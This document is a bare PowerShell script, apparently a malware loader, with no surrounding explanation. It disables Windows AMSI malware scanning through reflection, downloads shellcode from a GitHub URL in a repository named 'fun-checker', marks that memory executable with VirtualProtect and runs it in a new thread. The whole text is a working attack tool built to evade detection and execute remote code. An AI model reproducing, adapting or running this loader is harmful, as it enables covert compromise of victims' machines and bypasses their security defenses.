$ErrorActionPreference = "SilentlyContinue"

# AMSI bypass
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" } | Select-Object -First 1
$f = $a.GetFields("NonPublic,Static") | Where-Object { $_.Name -like "*Context" } | Select-Object -First 1
[Runtime.InteropServices.Marshal]::WriteInt32($f.GetValue($null), 0x41414141)

# Payload URL
$URL = "https://raw.githubusercontent.com/wsxdsd1337-pixel/fun-checker/main/payload.bin"

# Download shellcode into memory
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadData($URL)

# Allocate + write + execute
$k32 = [System.Runtime.InteropServices.Marshal]
$size = $data.Length
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, $size)

# Make memory executable
Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "K" -Namespace "W"

$old = 0
[W.K]::VirtualProtect($addr, [UIntPtr]$size, 0x40, [ref]$old) | Out-Null

# Create thread
Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
"@ -Name "T" -Namespace "W"

$h = [W.T]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[W.T]::WaitForSingleObject($h, 0xFFFFFFFF) | Out-Null